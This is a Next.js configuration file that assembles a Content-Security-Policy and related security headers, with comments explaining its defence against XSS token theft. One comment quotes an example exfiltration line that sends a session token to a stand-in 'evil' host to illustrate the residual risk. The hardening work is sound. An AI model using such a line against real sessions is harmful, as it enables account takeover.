/**
 * Content-Security-Policy is assembled here rather than written as a literal
 * so the Supabase origin comes from the same env var the client uses. Typing
 * the host twice is how it drifts, and the failure would be sign-in breaking
 * in production only.
 */
const supabaseOrigin = (() => {
  try {
    return new URL(process.env.NEXT_PUBLIC_SUPABASE_URL ?? "").origin;
  } catch {
    // Absent at build time (e.g. a bare `next build` with no env). Better to
    // ship a CSP without it than to crash the build — sign-in would fail
    // loudly and visibly, which is the right failure for a misconfiguration.
    return "";
  }
})();

const dev = process.env.NODE_ENV !== "production";

/**
 * ── What this does and does not buy ──────────────────────────────────────────
 *
 * `@supabase/ssr` sets its auth cookies with `httpOnly: false` — it has to,
 * because the browser client reads the session on the login page. So any XSS
 * here is a session takeover, not just a defacement. There are no XSS sinks in
 * this codebase today (no dangerouslySetInnerHTML, no innerHTML, no eval) and
 * React escapes by default; this is the layer for the day that stops being
 * true.
 *
 * `script-src` keeps `'unsafe-inline'`, and that is a deliberate trade rather
 * than an oversight. The strict alternative is a per-request nonce generated in
 * middleware, which Next.js supports — but a nonce changes every request, so
 * every page must render dynamically, and `/login`, `/preview`, `/privacy` and
 * `/terms` are currently static. Making the marketing and sign-in pages dynamic
 * to harden against an XSS that does not exist is the wrong side of that trade
 * today. Revisit if a rich-text or user-HTML feature ever lands, at which point
 * the nonce becomes worth the static rendering.
 *
 * What the rest of the policy still buys, even with inline script allowed, is
 * the **exfiltration** half of the attack. An injected script could run, but
 * `connect-src` stops it fetching to an attacker's host, `img-src` stops the
 * beacon trick, `form-action` stops a planted form posting the token away, and
 * `base-uri` stops a <base> tag silently repointing every relative URL. Stealing
 * a session is only useful if you can send it somewhere.
 *
 * Not blockable by CSP, and worth knowing: top-level navigation. `navigate-to`
 * is not supported by browsers, so `location = 'https://evil/?t=' + token`
 * remains open to any script that runs. That is the residual risk, and the
 * reason the answer to a real XSS would be fixing the XSS.
 */
const csp = [
  "default-src 'self'",
  // 'unsafe-eval' is dev-only: the HMR client needs it, production does not.
  `script-src 'self' 'unsafe-inline'${dev ? " 'unsafe-eval'" : ""}`,
  // next/font injects an inline <style> for its @font-face block.
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  // next/font self-hosts every face at build time — nothing is fetched from
  // Google at runtime, so this needs no external origin.
  "font-src 'self'",
  // Same-origin /api/*, plus Supabase Auth, which the browser client calls
  // directly for OTP sign-in. `ws:` is the dev HMR socket.
  //
  // Mixpanel is the one analytics origin, and it is a `connect-src` entry
  // only — no `script-src` change. The SDK comes from the `mixpanel-browser`
  // package and is bundled into our own JS, so nothing is fetched from
  // cdn.mxpnl.com at runtime; adding that CDN to script-src would have been a
  // far larger concession than this one host to send events to.
  //
  // This must stay in step with `api_host` in lib/analytics.ts. If they drift,
  // the browser blocks every event and the only symptom is a CSP violation in
  // the console — nothing surfaces in Mixpanel.
  [
    "connect-src 'self'",
    supabaseOrigin,
    // EU residency project — see the api_host note in lib/analytics.ts.
    "https://api-eu.mixpanel.com",
    dev ? "ws: http://localhost:*" : "",
  ]
    .filter(Boolean)
    .join(" "),
  "form-action 'self'",
  "base-uri 'self'",
  // Matches the X-Frame-Options below; that header is the fallback for old
  // browsers, this is the one modern ones honour.
  "frame-ancestors 'none'",
  "object-src 'none'",
  // Would rewrite http://localhost to https:// and break local testing.
  ...(dev ? [] : ["upgrade-insecure-requests"]),
].join("; ");

/** @type {import('next').NextConfig} */
const nextConfig = {
  // Discloses the framework and version to anyone fingerprinting for known
  // CVEs. Costs nothing to remove.
  poweredByHeader: false,
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          { key: "Content-Security-Policy", value: csp },
          { key: "X-Frame-Options", value: "DENY" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
        ],
      },
    ];
  },
};

export default nextConfig;
